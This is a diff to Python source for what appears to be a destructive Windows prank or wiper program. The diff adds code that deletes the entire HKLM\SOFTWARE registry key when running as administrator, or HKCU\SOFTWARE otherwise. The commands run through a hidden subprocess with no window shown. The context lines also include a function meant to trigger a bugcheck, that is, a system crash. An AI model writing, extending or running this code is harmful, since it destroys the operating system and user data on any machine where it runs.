@@ -36,15 +36,18 @@ def do_command(cmd):
     subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
 
 # do funny registry
-def regFuck():
+def regFuck(adm):
     try:
-        funny = winreg.HKEY_LOCAL_MACHINE
-        winreg.EnumKey(funny, 0)
-        do_command('reg delete "HKLM\SOFTWARE\Microsoft" /f')
+        if adm:
+            funny = winreg.HKEY_LOCAL_MACHINE
+            winreg.EnumKey(funny, 0)
+            do_command('reg delete "HKLM\SOFTWARE\" /f')
+        else:
+            do_command('reg delete HKCU\SOFTWARE\ /f')
     except:
         print('bruh')
 
-# throws a bugcheck
+# throws a bugcheck 
 def Bugcheck(code):
     try:
         # specify ntdll
